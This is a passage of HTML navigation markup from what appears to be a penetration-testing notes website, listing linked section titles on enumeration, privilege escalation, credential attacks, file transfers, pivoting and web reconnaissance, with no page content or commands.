md-icon"></span> </label> <nav class=md-nav aria-label="Host Based Enumeration" data-md-level=4> <label class=md-nav__title for=__nav_4_3_2_2> <span class="md-nav__icon md-icon"></span> Host Based Enumeration </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../footprinting/ftp/ class=md-nav__link> <span class=md-ellipsis> FTP </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/smb/ class=md-nav__link> <span class=md-ellipsis> SMB </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/nfs/ class=md-nav__link> <span class=md-ellipsis> NFS </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/dns/ class=md-nav__link> <span class=md-ellipsis> DNS </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/smtp/ class=md-nav__link> <span class=md-ellipsis> SMTP </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/imap_pop3/ class=md-nav__link> <span class=md-ellipsis> IMAP/POP3 </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/snmp/ class=md-nav__link> <span class=md-ellipsis> SNMP </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/mysql/ class=md-nav__link> <span class=md-ellipsis> MySQL </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/mssql/ class=md-nav__link> <span class=md-ellipsis> MSSQL </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/ipmi/ class=md-nav__link> <span class=md-ellipsis> IPMI </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_2_3 type=checkbox id=__nav_4_3_2_3> <label class=md-nav__link for=__nav_4_3_2_3> <span class=md-ellipsis> Remote Management Protocols </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Remote Management Protocols" data-md-level=4> <label class=md-nav__title for=__nav_4_3_2_3> <span class="md-nav__icon md-icon"></span> Remote Management Protocols </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../footprinting/linux_remote_management_protocol/ class=md-nav__link> <span class=md-ellipsis> Linux </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/windows_remote_management_protocol/ class=md-nav__link> <span class=md-ellipsis> Windows </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_3 type=checkbox id=__nav_4_3_3> <label class=md-nav__link for=__nav_4_3_3> <span class=md-ellipsis> Attacking Common Services </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Attacking Common Services" data-md-level=3> <label class=md-nav__title for=__nav_4_3_3> <span class="md-nav__icon md-icon"></span> Attacking Common Services </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../attacking_common_services/interacting/ class=md-nav__link> <span class=md-ellipsis> Interacting </span> </a> </li> <li class=md-nav__item> <a href=../../../attacking_common_services/attacking_ftp/ class=md-nav__link> <span class=md-ellipsis> FTP </span> </a> </li> <li class=md-nav__item> <a href=../../../attacking_common_services/attacking_smb/ class=md-nav__link> <span class=md-ellipsis> SMB </span> </a> </li> <li class=md-nav__item> <a href=../../../attacking_common_services/attacking_sql/ class=md-nav__link> <span class=md-ellipsis> SQL Databases </span> </a> </li> <li class=md-nav__item> <a href=../../../attacking_common_services/attacking_rdp/ class=md-nav__link> <span class=md-ellipsis> RDP </span> </a> </li> <li class=md-nav__item> <a href=../../../attacking_common_services/attacking_dns/ class=md-nav__link> <span class=md-ellipsis> DNS </span> </a> </li> <li class=md-nav__item> <a href=../../../attacking_common_services/attacking_email_services/ class=md-nav__link> <span class=md-ellipsis> Email Services </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4 type=checkbox id=__nav_4_3_4> <label class=md-nav__link for=__nav_4_3_4> <span class=md-ellipsis> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=3> <label class=md-nav__title for=__nav_4_3_4> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1 type=checkbox id=__nav_4_3_4_1> <label class=md-nav__link for=__nav_4_3_4_1> <span class=md-ellipsis> Windows </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Windows data-md-level=4> <label class=md-nav__title for=__nav_4_3_4_1> <span class="md-nav__icon md-icon"></span> Windows </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1_1 type=checkbox id=__nav_4_3_4_1_1> <label class=md-nav__link for=__nav_4_3_4_1_1> <span class=md-ellipsis> Getting the Lay of the Land </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Getting the Lay of the Land" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_1_1> <span class="md-nav__icon md-icon"></span> Getting the Lay of the Land </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/windows/gtlotl/ class=md-nav__link> <span class=md-ellipsis> Situational Awareness </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/init_enum/ class=md-nav__link> <span class=md-ellipsis> Initial Enumeration </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/comm_with_ps/ class=md-nav__link> <span class=md-ellipsis> Communication with Processes </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1_2 type=checkbox id=__nav_4_3_4_1_2> <label class=md-nav__link for=__nav_4_3_4_1_2> <span class=md-ellipsis> Windows User Privileges </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows User Privileges" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_1_2> <span class="md-nav__icon md-icon"></span> Windows User Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/windows/seimpersonate_seassignprimarytoken/ class=md-nav__link> <span class=md-ellipsis> SeImpersonate and SeAssignPrimaryToken </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/sebugpriv/ class=md-nav__link> <span class=md-ellipsis> SeDebugPrivilege </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/setakeownershippriv/ class=md-nav__link> <span class=md-ellipsis> SeTakeOwnershipPrivilege </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1_3 type=checkbox id=__nav_4_3_4_1_3> <label class=md-nav__link for=__nav_4_3_4_1_3> <span class=md-ellipsis> Windows Group Privileges </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Group Privileges" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_1_3> <span class="md-nav__icon md-icon"></span> Windows Group Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/windows/builtin_groups/ class=md-nav__link> <span class=md-ellipsis> Windows Built-in Groups </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/eventlog_readers/ class=md-nav__link> <span class=md-ellipsis> Event Log Readers </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/dnsadmins/ class=md-nav__link> <span class=md-ellipsis> DnsAdmins </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/hyperv_admins/ class=md-nav__link> <span class=md-ellipsis> Hyper-V Administrators </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/print_operators/ class=md-nav__link> <span class=md-ellipsis> Print Operators </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/server_operators/ class=md-nav__link> <span class=md-ellipsis> Server Operators </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1_4 type=checkbox id=__nav_4_3_4_1_4> <label class=md-nav__link for=__nav_4_3_4_1_4> <span class=md-ellipsis> Attacking the OS </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Attacking the OS" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_1_4> <span class="md-nav__icon md-icon"></span> Attacking the OS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/windows/user_account_control/ class=md-nav__link> <span class=md-ellipsis> User Account Control </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/weak_permissions/ class=md-nav__link> <span class=md-ellipsis> Weak Permissions </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/vulnerable_services/ class=md-nav__link> <span class=md-ellipsis> Vulnerable Services </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1_5 type=checkbox id=__nav_4_3_4_1_5> <label class=md-nav__link for=__nav_4_3_4_1_5> <span class=md-ellipsis> Credential Theft </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Credential Theft" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_1_5> <span class="md-nav__icon md-icon"></span> Credential Theft </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/windows/credential_hunting/ class=md-nav__link> <span class=md-ellipsis> Credential Hunting </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/other_files/ class=md-nav__link> <span class=md-ellipsis> Other Files </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/further_credential_theft/ class=md-nav__link> <span class=md-ellipsis> Further Credential Theft </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1_6 type=checkbox id=__nav_4_3_4_1_6> <label class=md-nav__link for=__nav_4_3_4_1_6> <span class=md-ellipsis> Additional Techniques </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Additional Techniques" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_1_6> <span class="md-nav__icon md-icon"></span> Additional Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/windows/interacting_with_users/ class=md-nav__link> <span class=md-ellipsis> Interacting with Users </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/miscellaneous_techniques/ class=md-nav__link> <span class=md-ellipsis> Miscellaneous Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_2 type=checkbox id=__nav_4_3_4_2> <label class=md-nav__link for=__nav_4_3_4_2> <span class=md-ellipsis> Linux </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Linux data-md-level=4> <label class=md-nav__title for=__nav_4_3_4_2> <span class="md-nav__icon md-icon"></span> Linux </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/linux/enumeration/ class=md-nav__link> <span class=md-ellipsis> Enumeration </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_2_2 type=checkbox id=__nav_4_3_4_2_2> <label class=md-nav__link for=__nav_4_3_4_2_2> <span class=md-ellipsis> Local Techniques </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Local Techniques" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_2_2> <span class="md-nav__icon md-icon"></span> Local Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/linux/kernel_exploits/ class=md-nav__link> <span class=md-ellipsis> Kernel Exploits </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/vulnerable_services/ class=md-nav__link> <span class=md-ellipsis> Vulnerable Services </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/cron_jobs/ class=md-nav__link> <span class=md-ellipsis> Cron Jobs </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/special_permissions/ class=md-nav__link> <span class=md-ellipsis> Special Permissions </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/sudo_rights_abuse/ class=md-nav__link> <span class=md-ellipsis> Sudo Rights Abuse </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/path_abuse/ class=md-nav__link> <span class=md-ellipsis> Path Abuse </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/wilcard_abuse/ class=md-nav__link> <span class=md-ellipsis> Wildcard Abuse </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/credential_hunting/ class=md-nav__link> <span class=md-ellipsis> Credential Hunting </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/shared_libraries/ class=md-nav__link> <span class=md-ellipsis> Shared Libraries </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/shared_object_hijacking/ class=md-nav__link> <span class=md-ellipsis> Shared Object Hijacking </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/privileged_groups/ class=md-nav__link> <span class=md-ellipsis> Privileged Groups </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/misc_techniques/ class=md-nav__link> <span class=md-ellipsis> Miscellaneous Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_5 type=checkbox id=__nav_4_3_5> <label class=md-nav__link for=__nav_4_3_5> <span class=md-ellipsis> File Transfers </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Transfers" data-md-level=3> <label class=md-nav__title for=__nav_4_3_5> <span class="md-nav__icon md-icon"></span> File Transfers </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_5_1 type=checkbox id=__nav_4_3_5_1> <label class=md-nav__link for=__nav_4_3_5_1> <span class=md-ellipsis> File Tranfer Methods </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Tranfer Methods" data-md-level=4> <label class=md-nav__title for=__nav_4_3_5_1> <span class="md-nav__icon md-icon"></span> File Tranfer Methods </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../file_transfers/windows_file_transfer_methods/ class=md-nav__link> <span class=md-ellipsis> Windows </span> </a> </li> <li class=md-nav__item> <a href=../../../file_transfers/linux_file_transfer_methods/ class=md-nav__link> <span class=md-ellipsis> Linux </span> </a> </li> <li class=md-nav__item> <a href=../../../file_transfers/transfering_files_w_code/ class=md-nav__link> <span class=md-ellipsis> Transfering Files with Code </span> </a> </li> <li class=md-nav__item> <a href=../../../file_transfers/miscellaneous_file_transfer_methods/ class=md-nav__link> <span class=md-ellipsis> Miscellaneous </span> </a> </li> <li class=md-nav__item> <a href=../../../file_transfers/protected_file_transfers/ class=md-nav__link> <span class=md-ellipsis> Protected File Transfers </span> </a> </li> <li class=md-nav__item> <a href=../../../file_transfers/catching_files_over_https/ class=md-nav__link> <span class=md-ellipsis> Catching Files over HTTP/S </span> </a> </li> <li class=md-nav__item> <a href=../../../file_transfers/living_off_the_land/ class=md-nav__link> <span class=md-ellipsis> LOTL </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_6 type=checkbox id=__nav_4_3_6> <label class=md-nav__link for=__nav_4_3_6> <span class=md-ellipsis> Tools </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tools data-md-level=3> <label class=md-nav__title for=__nav_4_3_6> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../tools/nmap/ class=md-nav__link> <span class=md-ellipsis> Nmap </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_6_2 type=checkbox id=__nav_4_3_6_2> <label class=md-nav__link for=__nav_4_3_6_2> <span class=md-ellipsis> MSF </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=MSF data-md-level=4> <label class=md-nav__title for=__nav_4_3_6_2> <span class="md-nav__icon md-icon"></span> MSF </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_6_2_1 type=checkbox id=__nav_4_3_6_2_1> <label class=md-nav__link for=__nav_4_3_6_2_1> <span class=md-ellipsis> Components </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Components data-md-level=5> <label class=md-nav__title for=__nav_4_3_6_2_1> <span class="md-nav__icon md-icon"></span> Components </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../tools/msf/components/msf_modules/ class=md-nav__link> <span class=md-ellipsis> Modules </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/msf/components/msf_targets/ class=md-nav__link> <span class=md-ellipsis> Targets </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/msf/components/msf_payloads/ class=md-nav__link> <span class=md-ellipsis> Payloads </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_6_2_2 type=checkbox id=__nav_4_3_6_2_2> <label class=md-nav__link for=__nav_4_3_6_2_2> <span class=md-ellipsis> Sessions </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Sessions data-md-level=5> <label class=md-nav__title for=__nav_4_3_6_2_2> <span class="md-nav__icon md-icon"></span> Sessions </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../tools/msf/sessions/msf_sessions_jobs/ class=md-nav__link> <span class=md-ellipsis> Sessions & Jobs </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/msf/sessions/msf_sessions_meterpreter/ class=md-nav__link> <span class=md-ellipsis> Meterpreter </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../tools/msf/additional_features/evasion/ class=md-nav__link> <span class=md-ellipsis> Evasion </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_7 type=checkbox id=__nav_4_3_7> <label class=md-nav__link for=__nav_4_3_7> <span class=md-ellipsis> Password Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Password Attacks" data-md-level=3> <label class=md-nav__title for=__nav_4_3_7> <span class="md-nav__icon md-icon"></span> Password Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_7_1 type=checkbox id=__nav_4_3_7_1> <label class=md-nav__link for=__nav_4_3_7_1> <span class=md-ellipsis> Remote Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Remote Attacks" data-md-level=4> <label class=md-nav__title for=__nav_4_3_7_1> <span class="md-nav__icon md-icon"></span> Remote Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../password_attacks/remote_password_attacks/network_services/ class=md-nav__link> <span class=md-ellipsis> Network Services </span> </a> </li> <li class=md-nav__item> <a href=../../../password_attacks/remote_password_attacks/password_mutations/ class=md-nav__link> <span class=md-ellipsis> Password Mutations </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_7_2 type=checkbox id=__nav_4_3_7_2> <label class=md-nav__link for=__nav_4_3_7_2> <span class=md-ellipsis> Windows Local Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Local Attacks" data-md-level=4> <label class=md-nav__title for=__nav_4_3_7_2> <span class="md-nav__icon md-icon"></span> Windows Local Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../password_attacks/windows_local_password_attacks/attacking_sam/ class=md-nav__link> <span class=md-ellipsis> Attacking Sam </span> </a> </li> <li class=md-nav__item> <a href=../../../password_attacks/windows_local_password_attacks/attacking_lsass/ class=md-nav__link> <span class=md-ellipsis> Attacking LSASS </span> </a> </li> <li class=md-nav__item> <a href=../../../password_attacks/windows_local_password_attacks/attacking_ad_ntdsdit/ class=md-nav__link> <span class=md-ellipsis> Attacking AD & NTDS.dit </span> </a> </li> <li class=md-nav__item> <a href=../../../password_attacks/windows_local_password_attacks/credential_hunting/ class=md-nav__link> <span class=md-ellipsis> Credential Hunting </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_7_3 type=checkbox id=__nav_4_3_7_3> <label class=md-nav__link for=__nav_4_3_7_3> <span class=md-ellipsis> Linux Local Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Linux Local Attacks" data-md-level=4> <label class=md-nav__title for=__nav_4_3_7_3> <span class="md-nav__icon md-icon"></span> Linux Local Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../password_attacks/linux_local_password_attacks/credential_hunting/ class=md-nav__link> <span class=md-ellipsis> Credential Hunting </span> </a> </li> <li class=md-nav__item> <a href=../../../password_attacks/linux_local_password_attacks/passwd_shadow_opasswd/ class=md-nav__link> <span class=md-ellipsis> Passwd, Shadow, Opasswd </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_7_4 type=checkbox id=__nav_4_3_7_4> <label class=md-nav__link for=__nav_4_3_7_4> <span class=md-ellipsis> Cracking Files </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Cracking Files" data-md-level=4> <label class=md-nav__title for=__nav_4_3_7_4> <span class="md-nav__icon md-icon"></span> Cracking Files </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../password_attacks/cracking_files/protected_files/ class=md-nav__link> <span class=md-ellipsis> Protected Files </span> </a> </li> <li class=md-nav__item> <a href=../../../password_attacks/cracking_files/protected_archives/ class=md-nav__link> <span class=md-ellipsis> Protected Archives </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_8 type=checkbox id=__nav_4_3_8> <label class=md-nav__link for=__nav_4_3_8> <span class=md-ellipsis> Pivoting, Tunneling, Port Forwarding </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Pivoting, Tunneling, Port Forwarding" data-md-level=3> <label class=md-nav__title for=__nav_4_3_8> <span class="md-nav__icon md-icon"></span> Pivoting, Tunneling, Port Forwarding </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../ptpf/dynamic_port_forwarding_ssh/ class=md-nav__link> <span class=md-ellipsis> Dynamic Port Forwarding w/ SSH and SOCKS Tunneling </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/remote_reverse_port_forwarding_ssh/ class=md-nav__link> <span class=md-ellipsis> Remote/Reverse Port Forwarding w/ SSH </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/meterpreter_tunneling_and_port_forwarding/ class=md-nav__link> <span class=md-ellipsis> Meterpreter Tunneling & Port Forwarding </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_8_4 type=checkbox id=__nav_4_3_8_4> <label class=md-nav__link for=__nav_4_3_8_4> <span class=md-ellipsis> Socat </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Socat data-md-level=4> <label class=md-nav__title for=__nav_4_3_8_4> <span class="md-nav__icon md-icon"></span> Socat </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../ptpf/socat/socat_reverse_shell/ class=md-nav__link> <span class=md-ellipsis> Reverse Shell </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/socat/socat_bind_shell/ class=md-nav__link> <span class=md-ellipsis> Bind Shell </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../ptpf/obstacles/ssh_for_win_plink/ class=md-nav__link> <span class=md-ellipsis> SSH for Windows: plink </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/obstacles/ssh_pivoting_sshuttle/ class=md-nav__link> <span class=md-ellipsis> SSH Pivoting w/ Sshuttle </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/obstacles/webserver_pivoting_rpivot/ class=md-nav__link> <span class=md-ellipsis> WebServer Pivoting w/ Rpivot </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/obstacles/port_forwarding_windows_netsh/ class=md-nav__link> <span class=md-ellipsis> Port Forwarding Windows: Netsh </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/dns_tunneling_dnscat2/ class=md-nav__link> <span class=md-ellipsis> DNS Tunneling w/ Dnscat2 </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/socks5_tunneling_chisel/ class=md-nav__link> <span class=md-ellipsis> SOCKS5 Tunneling with Chisel </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/icmp_tunneling_socks/ class=md-nav__link> <span class=md-ellipsis> ICMP Tunneling with SOCKS </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/rdp_socks_tunneling_socksoverrdp/ class=md-nav__link> <span class=md-ellipsis> RDP and SOCKS Tunneling w/ SocksOverRDP </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_9 type=checkbox id=__nav_4_3_9> <label class=md-nav__link for=__nav_4_3_9> <span class=md-ellipsis> Web </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Web data-md-level=3> <label class=md-nav__title for=__nav_4_3_9> <span class="md-nav__icon md-icon"></span> Web </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_9_1 type=checkbox id=__nav_4_3_9_1> <label class=md-nav__link for=__nav_4_3_9_1> <span class=md-ellipsis> Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Information Gathering" data-md-level=4> <label class=md-nav__title for=__nav_4_3_9_1> <span class="md-nav__icon md-icon"></span> Information Gathering </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_9_1_1 type=checkbox id=__nav_4_3_9_1_1> <label class=md-nav__link for=__nav_4_3_9_1_1> <span class=md-ellipsis> Passive Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Passive Information Gathering" data-md-level=5> <label class=md-nav__title for=__nav_4_3_9_1_1> <span class="md-nav__icon md-icon"></span> Passive Information Gathering </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../web/info_gathering/passive_info_gathering/whois/ class=md-nav__link> <span class=md-ellipsis> WHOIS </span> </a> </li> <li class=md-nav__item> <a href=../../../web/info_gathering/passive_info_gathering/dns/ class=md-nav__link> <span class=md-ellipsis> DNS </span> </a> </li> <li class=md-nav__item> <a href=../../../web/info_gathering/passive_info_gathering/passive_subdomain_enum/ class=md-nav__link> <span class=md-ellipsis> Subdomain Enumeration </span> </a> </li> <li class=md-nav__item> <a href=../../../web/info_gathering/passive_info_gathering/passive_infrastructure_identification/ class=md-nav__link> <span class=md-ellipsis> Infrastructure Identification </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_9_1_2 type=checkbox id=__nav_4_3_9_1_2> <label class=md-nav__link for=__nav_4_3_9_1_2> <span class=md-ellipsis> Active Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Active Information Gathering" data-md-level=5> <label class=md-nav__title for=__nav_4_3_9_1_2> <span class="md-nav__icon md-icon"></span> Active Information Gathering </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../web/info_gathering/active_info_gathering/active_infrastructure_identification/ class=md-nav__link> <span class=md-ellipsis> Infrastructure Identification </span> </a> </li> <li class=md-nav__item> <a href=../../../web/info_gathering/active_info_gathering/active_subdomain_enumeration/ class=md-nav__link> <span class=md-ellipsis> Subdomain Enumeration </span> </a> </li> <li class=md-nav__item> <a href=../../../web/info_gathering/active_info_gathering/virtual_hosts/ class=md-nav__link> <span class=md-ellipsis> Virtual Hosts </span> </a> </li> <li class=md-nav__item> <a href=../../../web/info_gathering/active_info_gathering/crawling/ class=md-nav__link> <span class=md-ellipsis> Crawling </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../tools/ffuf/ class=md-nav__link> <span class=md-ellipsis> Ffuf </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/hydra/ class=md-nav__link> 